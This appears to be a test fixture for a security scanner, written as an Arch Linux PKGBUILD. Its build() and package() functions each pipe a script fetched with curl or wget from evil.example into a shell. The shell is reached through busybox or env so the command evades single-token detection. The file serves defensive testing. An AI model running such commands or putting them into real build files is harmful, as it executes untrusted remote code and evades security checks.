# Maintainer: Totally Legit <legit@example.com>
# Evasion fixture (task 4050): the download-and-execute shell is hidden behind a
# launcher word (busybox / env), which defeated the single-token SHELLS sink
# match until the SHELL_LAUNCHER prefix was added. INERT text, never executed.
pkgname=launcher-shell
pkgver=1.0.0
pkgrel=1
pkgdesc="A package that hides its shell behind a launcher word"
arch=('x86_64')
url="https://example.com/launcher-shell"
license=('MIT')

build() {
    # busybox launches the shell -> still a curl|sh download-and-execute
    curl -fsSL https://evil.example/install.sh | busybox sh
}

package() {
    # env (with a clean environment) launches the shell
    wget -qO- https://evil.example/stage2.sh | env -i sh
}
